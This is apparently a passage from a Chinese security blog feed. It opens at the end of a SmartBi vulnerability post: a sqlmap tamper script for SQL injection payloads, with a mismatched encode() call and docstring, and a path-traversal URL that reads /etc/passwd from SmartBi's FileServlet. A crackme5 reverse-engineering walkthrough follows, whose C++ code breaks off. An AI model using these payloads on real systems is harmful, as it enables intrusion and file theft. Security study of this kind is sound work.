&quot;Z&quot;, &quot;(&quot;: &quot;a&quot;, &quot;~&quot;: &quot;b&quot;, &quot;i&quot;: &quot;c&quot;, &quot;h&quot;: &quot;d&quot;, &quot;p&quot;: &quot;e&quot;, &quot;_&quot;: &quot;f&quot;, &quot;-&quot;: &quot;g&quot;, &quot;I&quot;: &quot;h&quot;, &quot;R&quot;: &quot;i&quot;, &quot;.&quot;: &quot;j&quot;, </span><br><span class="line">    &quot;G&quot;: &quot;k&quot;, &quot;S&quot;: &quot;l&quot;, &quot;d&quot;: &quot;m&quot;, &quot;6&quot;: &quot;n&quot;, &quot;w&quot;: &quot;o&quot;, &quot;5&quot;: &quot;p&quot;, &quot;0&quot;: &quot;q&quot;, &quot;4&quot;: &quot;r&quot;, &quot;D&quot;: &quot;s&quot;, &quot;k&quot;: &quot;t&quot;, &quot;Q&quot;: &quot;u&quot;, </span><br><span class="line">    &quot;g&quot;: &quot;v&quot;, &quot;b&quot;: &quot;w&quot;, &quot;C&quot;: &quot;x&quot;, &quot;2&quot;: &quot;y&quot;, &quot;X&quot;: &quot;z&quot;, &quot;e&quot;: &quot;~&quot;, &quot;y&quot;: &quot;_&quot;, </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#此函数可以用来加密明文也可以解密服务器返回的密文</span><br><span class="line">def encode(code):</span><br><span class="line">    out &#x3D; &quot;&quot;</span><br><span class="line">    for item in code:</span><br><span class="line">        out &#x3D; out + ENCODING_SCHEDULE.get(item, item)</span><br><span class="line">    return out</span><br><span class="line"></span><br><span class="line">def decode(code):</span><br><span class="line">    out &#x3D; &quot;&quot;</span><br><span class="line">    for item in code:</span><br><span class="line">        out &#x3D; out + DECODING_SCHEDULE.get(item, item)</span><br><span class="line">    return out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    rmi-encodes all characters in a given payload</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&quot;1&#39; AND SLEEP(5)#&quot;)</span><br><span class="line">    &#39;MScgQU5EIFNMRUVQKDUpIw&#x3D;&#x3D;&#39;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    return encode(payload, binary&#x3D;False) if payload else payload</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120111021112.png" alt="image-20210120111021112"></p><h1 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h1><p>V85以下的可能任意文件下载都有。V95版本不存在。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;127.0.0.1&#x2F;vision&#x2F;FileServlet?ftpType&#x3D;out&amp;path&#x3D;upload&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&amp;name&#x3D;%E4%B8%AD%E5%9B%BD%E7%9F%B3%E6%B2%B9%E5%90%89%E6%9E%97%E7%99%BD%E5%9F%8E%E9%94%80%E5%94%AE%E5%88%86%E5%85%AC%E5%8F%B8XX%E5%8A%A0%E6%B2%B9%E7%AB%99%E9%98%B2%E9%9B%B7%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E9%A2%84%E6%A1%88.docx</span><br></pre></td></tr></table></figure><p>[<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210112145403202.png" alt="image-20210112145403202"></p><p><a href="http://b0urne.top/2021/01/12/smartBi总结/image-20210112182330751.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210112182330751.png" alt="image-20210112182330751"></a></p><blockquote><p>转载：<a href="http://b0urne.top/2021/01/12/smartBi%E6%80%BB%E7%BB%93/">http://b0urne.top/2021/01/12/smartBi%E6%80%BB%E7%BB%93/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SmartBi简介&quot;&gt;&lt;a href=&quot;#SmartBi简介&quot; class=&quot;headerlink&quot; title=&quot;SmartBi简介&quot;&gt;&lt;/a&gt;SmartBi简介&lt;/h1&gt;&lt;p&gt;Smartbi是企业级商业智能和大数据分析平台，满足用户在企业级报表、数据可视化分析
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Smartbi" scheme="http://www.ol4three.com/tags/Smartbi/"/>
    
  </entry>
  
  <entry>
    <title>crackme-系列之-crackme5</title>
    <link href="http://www.ol4three.com/2021/01/16/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/crackme%E7%B3%BB%E5%88%97/crackme-%E7%B3%BB%E5%88%97%E4%B9%8B-crackme5/"/>
    <id>http://www.ol4three.com/2021/01/16/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/crackme%E7%B3%BB%E5%88%97/crackme-%E7%B3%BB%E5%88%97%E4%B9%8B-crackme5/</id>
    <published>2021-01-16T11:50:38.000Z</published>
    <updated>2021-01-25T02:52:24.486Z</updated>
    
    <content type="html"><![CDATA[<p>这个和Crackme005和004的作者是同一个，不过增加了更多的防护</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103220232.png" alt="image-20210125103220232" style="zoom: 50%;"><h1 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h1><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120195625319.png" alt="image-20210120195625319"></p><p>程序是使用Delphi编写的，加了个UPX壳，随随便便就能脱掉。 </p><p><strong>关于脱壳</strong> </p><p>这个壳的话，有三种脱的方式，PEiD通用脱壳器 手动脱和专用的脱壳器，这里建议用专用的脱壳器 反汇编代码和对 齐比较准确方便后面的分析，我用脱壳器脱的时候报错了，所以直接从网上找了一个脱好了的。</p><p><strong>使用DarkDe分析程序</strong></p><p>把脱壳后的程序拖如DarkDe</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120195655282.png" alt="image-20210120195655282"></p><p>首先来观察一下窗体，发现这里有一个隐藏的Edit框。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120195721307.png" alt="image-20210120195721307"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120200330046.png" alt="image-20210120200330046"></p><p>再来观察一下事件按钮，有如下几个响应事件：</p><ul><li>表单创建 </li><li>Timer1定时器 </li><li>按钮的鼠标按下事件 </li><li>双击事件 </li><li>Edit2的双击事件 </li><li>表单的鼠标移动事件 </li><li>Image1的鼠标按下事件 </li><li>Image2的鼠标按下事件 </li><li>Image3的鼠标按下事件 </li><li>Image4的鼠标按下事件 </li><li>Timer2定时器 </li><li>按钮点击事件</li></ul><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120200406677.png" alt="image-20210120200406677"></p><p>接着再来看一下控件的ID，这个会方便以后的分析，注意了，如果你脱壳用的是手动的方法或者是通用脱壳机，这个 控件ID是显示不出来的。所以能用专用脱壳器脱尽量不要手脱。</p><h1 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h1><h2 id="导出符号"><a href="#导出符号" class="headerlink" title="导出符号"></a>导出符号</h2><p>首先为了方便我们分析，把程序拖到IDA里，添加Delphi的所有的签名，然后导出map文件，加载到OD中，方便后 续的调试。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120200444859.png" alt="image-20210120200444859"></p><p>找到这个注册成功的字符串，跟进去。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120200534065.png" alt="image-20210120200534065"></p><p>拉到函数头的位置，我们看到右边有个IDA的注释，说明这个是Timer2的响应事件。然后这里有连续的五条跳转指 令，都是跳到函数结束的位置。那么要想注册成功，就必须让这五个条件不成立。</p><h2 id="分析第一层防护"><a href="#分析第一层防护" class="headerlink" title="分析第一层防护"></a>分析第一层防护</h2><p>右键-&gt;查找所有常量-&gt;查找0x3C4，找到0xC34被赋值的位置，我们的目的是不让这个地方被赋值。</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102010466.png" alt="image-20210125102010466" style="zoom:50%;"><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102025835.png" alt="image-20210125102025835"></p><p>接着找到函数头的位置，IDA的位置显示这个是表单的创建事件</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102137688.png" alt="image-20210125102137688"></p><h2 id="分析表单创建事件"><a href="#分析表单创建事件" class="headerlink" title="分析表单创建事件"></a>分析表单创建事件</h2><p>接着，在函数头的位置下断点，分析整个表单创建事件。分析表单创建事件的目的是为了让ebx+0x304这个位置的值 不被赋值为0xC34。整个事件的代码分析如下：</p><h3 id="初始化控件"><a href="#初始化控件" class="headerlink" title="初始化控件"></a>初始化控件</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102207313.png" alt="image-20210125102207313"></p><h3 id="读取文件内容"><a href="#读取文件内容" class="headerlink" title="读取文件内容"></a>读取文件内容</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102235503.png" alt="image-20210125102235503"></p><p>接着获取 C:\ajj.126.c0m\j\o\j\o\ok.txt 的文件句柄，读取文件，然后检索IO输入操作结果，如果检索失败， 直接退出函数。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102303644.png" alt="image-20210125102303644"></p><p>如果文件存在，那么从文本中读取字符串，然后比较文本中的字符串是否是作者要求的，这个123456789是我自己写 入txt文件中测试用的，如果要复制作者要求的那个字符串，必须把从0x20开始到00的所有十六进制复制下来。如果 字符串比较通过，那么就会跳过 [ebx+0x304] 被赋值为 0xC34 的过程，至此整个表单创建函数就完成了。</p><h2 id="破解第一层防护"><a href="#破解第一层防护" class="headerlink" title="破解第一层防护"></a>破解第一层防护</h2><p>创建文件，路径为: C:\ajj.126.c0m\j\o\j\o\ok.txt ，然后将 20 61 6A 6A D0 B4 B5 C4 43 4B 6D 65 D5 E6 C0 C3 21 FF FF 用十六进制编辑器写入到文本。</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102357554.png" alt="image-20210125102357554" style="zoom: 50%;"><p>成功破解第一层防护之后，隐藏的Edit编辑框就出来了。但是这个编辑框是被禁用的。</p><h2 id="分析第二层防护"><a href="#分析第二层防护" class="headerlink" title="分析第二层防护"></a>分析第二层防护</h2><p>计时器的五个条件我们已经满足了第一个，接下来回到计时器的入口，从第二个条件入手。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102428696.png" alt="image-20210125102428696"></p><p>条件二调试默认已经满足了，跳转不会实现。那么我们现在要满足条件三，让 [ebx+0x310] 赋值为 0xF94 。 同样，搜索 0xF94 这个常量，找到赋值的地方。</p><p>直接跟进去，拉到函数头部，发现这里是表单的鼠标移动事件。接下来开始分析这个事件的所有的代码。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102444370.png" alt="image-20210125102444370"></p><h3 id="分析表单的鼠标移动事件"><a href="#分析表单的鼠标移动事件" class="headerlink" title="分析表单的鼠标移动事件"></a>分析表单的鼠标移动事件</h3><p>接下来在函数头部下断点，然后从左上角移动到表单，触发断点，分析整个函数。 获取坐标</p><h3 id="获取坐标"><a href="#获取坐标" class="headerlink" title="获取坐标"></a>获取坐标</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102521585.png" alt="image-20210125102521585"></p><p>首先把参数一和参数二给edx和eax，我们必须知道这两个参数是什么。因为这是鼠标点击事件，初步猜测是鼠标的X 和Y坐标。接下来做四次测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">左上角：edx&#x3D;0 eax&#x3D;0x1C</span><br><span class="line">右上角：edx&#x3D;0 eax&#x3D;0x101</span><br><span class="line">左下角：edx&#x3D;0x13B eax&#x3D;0x5 </span><br><span class="line">右下角：edx&#x3D;0x13B eax&#x3D;0x103</span><br></pre></td></tr></table></figure><p>当从不同的位置移入表单，对应的eax和edx的值都不相同，所以判断这两个参数是横纵坐标，而且坐标系的原点在 左上角。</p><h3 id="校验图片"><a href="#校验图片" class="headerlink" title="校验图片"></a>校验图片</h3><p>接着函数取出了一个图片对象，然后判断是否是这个图片对象</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102613117.png" alt="image-20210125102613117"></p><p>可以看到Image3的ID是0x2E0,所以只有当图片为Image3的时候才能满足条件，而Image3根据测试是”性相近”</p><h3 id="校验坐标"><a href="#校验坐标" class="headerlink" title="校验坐标"></a>校验坐标</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102638850.png" alt="image-20210125102638850"></p><p>接着将横坐标和0xE2做比较，将纵坐标和0x12C做比较，小于或等于跳转，那么就是说如果想让他不跳转，横纵坐标 必须大于这两个值。整个表单的原点是左上角，那么我们必须从右下角移入才能满足条件。</p><h3 id="再次校验图片和坐标"><a href="#再次校验图片和坐标" class="headerlink" title="再次校验图片和坐标"></a>再次校验图片和坐标</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102710719.png" alt="image-20210125102710719"></p><p>接着再次校验图片是否是Image2 Image2是性本善，然后校验横坐标和纵坐标，这一次必须从左下角移入才能满足条 件。然后再判断 [ebx+0x30C] 这个地址的值是否是 0x9 ，默认这个值是0x9，所以这里又是一层防护。只有满足了 [ebx+0x30C]这个地址的值是9，才能把ebx+0x310赋值为0xF94，也就是满足我们的第二层防护。</p><h2 id="分析第三层防护"><a href="#分析第三层防护" class="headerlink" title="分析第三层防护"></a>分析第三层防护</h2><p>接下来还是一样，要让[ebx+0x30C]这个地址的值不为9，查找所有常量。符合要求的只有第一条和第二条。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102744480.png" alt="image-20210125102744480"></p><p>而第一条跟进去发现这是之前分析过的表单创建的时候就被赋值为30C，所以目标不是这里，是第二条。</p><p>第二条跟进去，拉到函数头的位置</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102842402.png" alt="image-20210125102842402"></p><p>发现这里是Edit2的双击事件，而Edit2目前是禁用的，所以双击事件根本断不下来，这又是一层防护。</p><h2 id="分析第四层防护"><a href="#分析第四层防护" class="headerlink" title="分析第四层防护"></a>分析第四层防护</h2><p>想要破解第二层防护必须先破解第三层防护，想要破解第三层防护，就必须先破解第四层防护，这是在玩俄罗斯套娃 啊。那么我们这一步必须让Edit2控件变成启用状态。怎么做呢？利用刚才看到的控件ID。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102911173.png" alt="image-20210125102911173"></p><p>Edit2的控件ID是0x2F0，接着搜索所有常量。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102928655.png" alt="image-20210125102928655"></p><p>挨个点进去进行查找，经过排查发现真正的开启Edit2 控件的是第四个。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102945232.png" alt="image-20210125102945232"></p><p>这个函数并不长，是Panel1的双击事件，想要让Edit2控件被启用，就必须让eax+0x308这个地址被赋值为0x29D。 Panel是什么东西呢。打开一下DarkDe，中间的这个大按钮就是Panel1，注意不是图片是按钮。所以想要触发这个 事件必须是双击空白处才能让程序断下。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102959965.png" alt="image-20210125102959965"></p><h2 id="分析第五层防护"><a href="#分析第五层防护" class="headerlink" title="分析第五层防护"></a>分析第五层防护</h2><p>0x308</p><p>查找常量，第三条，跟进去,这里是注册按钮的鼠标按下事件。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103022846.png" alt="image-20210125103022846"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103033990.png" alt="image-20210125103033990"></p><p>首先比较edx=0x230D，这个是直接能通过的，没有给咱下套，我还以为又套了一层。接着比较cl是1，cl的话必须是 右键单击，还是用猜，鼠标无非就量个参数，坐标和左右按键。eax+0x308的初始值是0x28E，右键单击一次增加 3，所以只要将注册按钮右键单击5次，第五层防护就算过了。</p><h2 id="破解第五层防护"><a href="#破解第五层防护" class="headerlink" title="破解第五层防护"></a>破解第五层防护</h2><p>右键单击五次注册按钮</p><h2 id="破解第四层防护"><a href="#破解第四层防护" class="headerlink" title="破解第四层防护"></a>破解第四层防护</h2><p>第五层防护已经过了，那么接下来来到没有解决的第四层。 鼠标右键单击五次注册按钮，然后等图片过了，双击大按钮，响应事件断下</p><p>![image-20210125103114930](../../../../../../../Library/Application Support/typora-user-images/image-20210125103114930.png)</p><p>这个时候可以看到eax+0x308的值已经是29D了</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103132371.png" alt="image-20210125103132371" style="zoom: 50%;"><p>Edit2编辑框也能正常使用了。</p><h2 id="破解第三层防护"><a href="#破解第三层防护" class="headerlink" title="破解第三层防护"></a>破解第三层防护</h2><p>Edit2编辑框的编辑框已经启用了，那么接下来双击编辑框</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103315446.png" alt="image-20210125103315446"></p><p>程序成功断下，接下来分析Edit2的双击事件。我们的目的要让[ebx+0x30C]被赋值为eax，达到破解第二层防护的条件</p><h3 id="分析Edit2双击事件"><a href="#分析Edit2双击事件" class="headerlink" title="分析Edit2双击事件"></a>分析Edit2双击事件</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103343496.png" alt="image-20210125103343496"></p><p>首先获取Edit2的内容，然后获取长度，长度必须等于8，然后比较第二个字符是否是0x5F，0x5F就是下划线。比较第六个字符是否是0x2C，0x2C就是“,”</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103400603.png" alt="image-20210125103400603"></p><p>获取Edit1的内容和长度，然后将长度+3之后除以3</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103420194.png" alt="image-20210125103420194"></p><p>比较余数，余数必须为0。就是说Edit1的长度必须为3的倍数。至此，Ddit2双击事件分析完成。</p><p>第一个编辑框长度必须是3的倍数，第二个编辑框第二个字符必须是下划线，第六个字符必须的逗号</p><h2 id="破解第二层防护"><a href="#破解第二层防护" class="headerlink" title="破解第二层防护"></a>破解第二层防护</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103516698.png" alt="image-20210125103516698"></p><p>当破解了第三层防护的时候，第二层防护的比较条件也就满足了。继续往下分析。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103540997.png" alt="image-20210125103540997"></p><p>接着往下走，程序会获取第一个编辑框的内容然后和ajj做比较，也就是说第一个编辑框必须为ajj。然后会把数字转成 字符串显示到控件。</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103555696.png" alt="image-20210125103555696" style="zoom: 50%;"><h2 id="破解第六层防护"><a href="#破解第六层防护" class="headerlink" title="破解第六层防护"></a>破解第六层防护</h2><p>接下来来到总验证的地方。也就是一开始的定时器，看看现在的校验情况如何。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103631516.png" alt="image-20210125103631516"></p><p>我们已经过掉了前三个验证，接下来要过掉第四个，也就是要让ebx+0x318等于ebx+0x314。那么要搞清楚0x318和 0x314这两个位置是怎么被赋值的</p><h3 id="分析0x318"><a href="#分析0x318" class="headerlink" title="分析0x318"></a>分析0x318</h3><p>搜索所有常量-&gt;0x318</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103703124.png" alt="image-20210125103703124"></p><p>除了第一个设置初始值，剩下的所有对这个地址的变量做加法运算。随便点进去第二个，增加二的位置</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103717455.png" alt="image-20210125103717455"></p><p>这里是图片1的鼠标按下的位置，而且显示的是注册不成功。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103733538.png" alt="image-20210125103733538"></p><p>首先判断鼠标按下的是左键还是右键，如果是左键+2，右键+0x11。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103752150.png" alt="image-20210125103752150"></p><p>再次回到所有常量的位置，那么规律也就出来了，这几个加法分别对应四张图片，根据点击的按键不同，加的值也不 同。0x318这个位置搞明白了，接下来去分析0x314。</p><h3 id="分析0x314"><a href="#分析0x314" class="headerlink" title="分析0x314"></a>分析0x314</h3><p>搜索所有常量-&gt;0x314。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103826835.png" alt="image-20210125103826835"></p><p>0x314被赋值的地方也有很多，分别对应五个值。这个几个地址相差的值比较小，说明是同一个函数，随便点进去一 个。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103844902.png" alt="image-20210125103844902"></p><p>这里是之前分析过的表单的鼠标移动事件，这个地址的值取决于eax的值，有四种情况第一种情况赋值为0x41，第二 种情况赋值为0x3D，第三种情况赋值为0x34，第三种情况赋值为0xDF。然后根据不同的情况，在界面上会显示一个 数字。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103906565.png" alt="image-20210125103906565"></p><p>而eax的值来自于0x30C这个位置，又得继续往上找。</p><h2 id="破解第七层保护"><a href="#破解第七层保护" class="headerlink" title="破解第七层保护"></a>破解第七层保护</h2><p>接下来还是查找所有常量-&gt;0x30C</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125104018200.png" alt="image-20210125104018200"></p><p>来到给0x30C赋值的位置，这里是编辑框的双击事件，之前已经分析过了，但是我没有分析上面两个call具体是做什 么的。 第一个call是获取磁盘的剩余空间，然后将eax做一系列的处理，交给第二个call，第二个call是纯粹的算法了。 最后这两处结合，是根据显示的数字不同，然后对图片采用不同的点击方案。</p><h2 id="点击事件的编写"><a href="#点击事件的编写" class="headerlink" title="点击事件的编写"></a>点击事件的编写</h2><p>根据不同的数字导致的在不同图片时左右点击相加=314即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">void CCM005Dlg::OnOK() </span><br><span class="line">&#123;</span><br><span class="line">        &#x2F;&#x2F; TODO: Add extra validation here</span><br><span class="line">         </span><br><span class="line">        &#x2F;&#x2F;CDialog::OnOK();</span><br><span class="line"> </span><br><span class="line">        char szKey[1024]&#x3D;&#123;0&#125;;</span><br><span class="line">        int n &#x3D; 0;</span><br><span class="line">        GetDlgItemText(IDC_EDIT1,szKey,1024);</span><br><span class="line">        if(!strlen(szKey))</span><br><span class="line">        &#123;</span><br><span class="line"> </span><br><span class="line">                MessageBox(&quot;请按照【前期步骤】获取正确数值后再生成方案！&quot;,&quot;友情提示&quot;);</span><br><span class="line">                return;</span><br><span class="line">        &#125;</span><br><span class="line">        n &#x3D; GetDlgItemInt(IDC_EDIT1);</span><br><span class="line">         </span><br><span class="line"> </span><br><span class="line">        switch(n)&#123;</span><br><span class="line">    case 1  :</span><br><span class="line">                n&#x3D;0x3D;</span><br><span class="line">                break; </span><br><span class="line">        case 2  :</span><br><span class="line">                n&#x3D;0x34;</span><br><span class="line">                break; </span><br><span class="line">        case 3  :</span><br><span class="line">                n&#x3D;0xDF;</span><br><span class="line">                break; </span><br><span class="line"> </span><br><span class="line">        default : &#x2F;&#x2F; 可选的</span><br><span class="line">                n&#x3D;0x41;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">        &#x2F;&#x2F;sprintf(szKey,&quot;%d&quot;,n);</span><br><span class="line">        &#x2F;&#x2F;SetDlgItemText(IDC_EDIT2,szKey);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">                struct  image</span><br><span class="line">        &#123;</span><br><span class="line">                char szname[7];</span><br><span class="line">                int nNumber ;</span><br><span class="line">                int nLef;</span><br><span class="line">                int nRight;</span><br><span class="line">        &#125;;</span><br><span class="line">        image aImage[4]&#x3D;&#123;0&#125;;</span><br><span class="line"> </span><br><span class="line">        sprintf(aImage[0].szname,&quot;人之初&quot;);</span><br><span class="line">        aImage[0].nNumber &#x3D; 1;</span><br><span class="line">        aImage[0].nLef &#x3D; 0x2;</span><br><span class="line">        aImage[0].nRight &#x3D; 0x11;</span><br><span class="line">         </span><br><span class="line">        sprintf(aImage[1].szname,&quot;性本善&quot;);</span><br><span class="line">        aImage[1].nNumber &#x3D; 2;</span><br><span class="line">        aImage[1].nLef &#x3D; 0x3;</span><br><span class="line">        aImage[1].nRight &#x3D; 0x13;</span><br><span class="line">         </span><br><span class="line">        sprintf(aImage[2].szname,&quot;性相近&quot;);</span><br><span class="line">        aImage[2].nNumber &#x3D; 3;</span><br><span class="line">        aImage[2].nLef &#x3D; 0x5;</span><br><span class="line">        aImage[2].nRight &#x3D; 0x17;</span><br><span class="line">         </span><br><span class="line">        sprintf(aImage[3].szname,&quot;习相远&quot;);</span><br><span class="line">        aImage[3].nNumber &#x3D; 4;</span><br><span class="line">        aImage[3].nLef &#x3D; 0x7;</span><br><span class="line">        aImage[3].nRight &#x3D; 0x1B;</span><br><span class="line">&#x2F;************************************************************************&#x2F;</span><br><span class="line">&#x2F;* 设计原则，选择出点击次数最少的方案</span><br><span class="line">&#x2F;* iR作为大数数组下标,iL作为小数数组下标,j大数商,k小数商,求i+j最小值                                                                </span><br><span class="line">&#x2F;************************************************************************&#x2F;</span><br><span class="line">    int nRes &#x3D; 112;</span><br><span class="line">        int nIL &#x3D; 0;</span><br><span class="line">        int nIR &#x3D; 0;</span><br><span class="line">        int nJ &#x3D; 0;</span><br><span class="line">        int nK &#x3D;0 ;</span><br><span class="line">        for (int iL&#x3D;0;iL&lt;4;iL++)</span><br><span class="line">        &#123;</span><br><span class="line">                for (int iR&#x3D;0;iR &lt; 4;iR++)</span><br><span class="line">                &#123;</span><br><span class="line">                 </span><br><span class="line">                for (int j&#x3D;1;j&lt;&#x3D;14;j++)</span><br><span class="line">                &#123;</span><br><span class="line">                        for (int k &#x3D;0;k&lt;&#x3D;112;k++)</span><br><span class="line">                        &#123;</span><br><span class="line">                                 </span><br><span class="line">                                if ((aImage[iR].nRight*j + aImage[iL].nLef*k &#x3D;&#x3D; n) &amp;&amp; (nRes&gt; j+k))</span><br><span class="line">                                &#123;</span><br><span class="line">                    nIL &#x3D; iL;</span><br><span class="line">                    nIR &#x3D; iR;</span><br><span class="line">                                        nJ &#x3D; j;</span><br><span class="line">                                        nK &#x3D; k;</span><br><span class="line">                                        nRes &#x3D; j+k ;</span><br><span class="line">                                &#125;</span><br><span class="line">                                 </span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                &#125;</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        